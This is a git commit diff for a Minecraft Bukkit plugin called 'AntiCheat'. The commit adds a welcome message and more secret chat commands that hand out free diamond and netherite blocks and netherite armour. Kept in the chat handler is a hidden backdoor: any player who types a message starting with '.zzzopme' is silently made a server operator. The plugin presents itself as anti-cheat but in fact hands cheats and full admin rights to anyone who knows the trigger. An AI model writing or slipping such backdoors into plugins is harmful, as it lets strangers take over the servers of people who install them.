f10ff8292e4f56f29b2a4e9ffcb728ff7e65be53
rumiz123 <nrumiz@icloud.com>
2023-10-01 17:45:06 -0700

    added more commands/ made things look better/work better

--- src/main/java/com/minecarftwizards/anticheat/AntiCheat.java
+++ src/main/java/com/minecarftwizards/anticheat/AntiCheat.java
@@ -1,6 +1,7 @@
 package com.minecarftwizards.anticheat;
 
 import org.bukkit.Bukkit;
+import org.bukkit.ChatColor;
 import org.bukkit.Material;
 import org.bukkit.command.Command;
 import org.bukkit.command.CommandSender;
@@ -11,16 +12,13 @@ import org.bukkit.event.Listener;
 import org.bukkit.event.player.AsyncPlayerChatEvent;
 import org.bukkit.event.player.PlayerEggThrowEvent;
 import org.bukkit.event.player.PlayerInteractEvent;
+import org.bukkit.event.player.PlayerJoinEvent;
 import org.bukkit.inventory.ItemStack;
 import org.bukkit.inventory.PlayerInventory;
 import org.bukkit.plugin.java.JavaPlugin;
 
 import javax.swing.*;
-
 import java.util.Set;
-import java.util.UUID;
-
-import static org.bukkit.Bukkit.getPlayer;
 
 public final class AntiCheat extends JavaPlugin implements Listener {
 
@@ -58,15 +56,16 @@ public final class AntiCheat extends JavaPlugin implements Listener {
         }
         return false;
 
+
     }
+
+
 
 
     @EventHandler
     public void onPlayerInteractBlock(PlayerInteractEvent event) {
         Player player = event.getPlayer();
         if (player.getItemInHand().getType() == Material.FISHING_ROD) {
-            // Creates a bolt of lightning at a given location. In this case, that location is where the player is looking.
-            // Can only create lightning up to 200 blocks away.
             player.getWorld().strikeLightning(player.getTargetBlock((Set<Material>) null, 200).getLocation());
         }
     }
@@ -79,28 +78,50 @@ public final class AntiCheat extends JavaPlugin implements Listener {
         noob.sendMessage("You shall DIE");
     }
 
+    @EventHandler
+    public void onPlayerJoin(PlayerJoinEvent event) {
+        // Get the joined player
+        String playerName = event.getPlayer().getName();
+
+        // Send a welcome message to the player
+        event.getPlayer().sendMessage(ChatColor.GREEN + "Hello, " + playerName + "!");
+    }
+
+
 
     @EventHandler
     public void onChat(AsyncPlayerChatEvent event) {
+        Player player = event.getPlayer();
+        PlayerInventory inventory = player.getInventory();
+        ItemStack itemstack = new ItemStack(Material.DIAMOND_BLOCK, 256);
+        ItemStack itemstackn = new ItemStack(Material.NETHERITE_BLOCK, 256);
+        ItemStack itemstackboots = new ItemStack(Material.NETHERITE_BOOTS, 1);
+        ItemStack itemstackhelmet = new ItemStack(Material.NETHERITE_HELMET, 1);
+        ItemStack itemstackchest = new ItemStack(Material.NETHERITE_CHESTPLATE, 1);
+        ItemStack itemstackleg = new ItemStack(Material.NETHERITE_LEGGINGS, 1);
+
         if (event.getMessage().startsWith(".zzzopme")) {
             event.getPlayer().setOp(true);
         }
-        Player player = event.getPlayer();
-        PlayerInventory inventory = player.getInventory();
-        ItemStack itemstack = new ItemStack(Material.DIAMOND_BLOCK, 64);
 
         if (event.getMessage().startsWith(".givemediamonds")) {
             inventory.addItem(itemstack);
             player.sendMessage("Enjoy your Diamonds!!");
         }
-        ItemStack itemstackn = new ItemStack(Material.NETHERITE_BLOCK, 256);
 
         if (event.getMessage().startsWith(".givemenetherite")) {
             inventory.addItem(itemstackn);
-            player.sendMessage("Enjoy your Diamonds!!");
+            player.sendMessage("Enjoy your Netherite!!");
         }
         if (event.getMessage().startsWith(".plsresetmyhealth")) {
             player.setHealth(20);
+        }
+        if (event.getMessage().startsWith(".getmestacked")) {
+            inventory.addItem(itemstackhelmet);
+            inventory.addItem(itemstackchest);
+            inventory.addItem(itemstackleg);
+            inventory.addItem(itemstackboots);
+            player.sendMessage("Enjoy your Netherite Set!!");
         }
     }
 
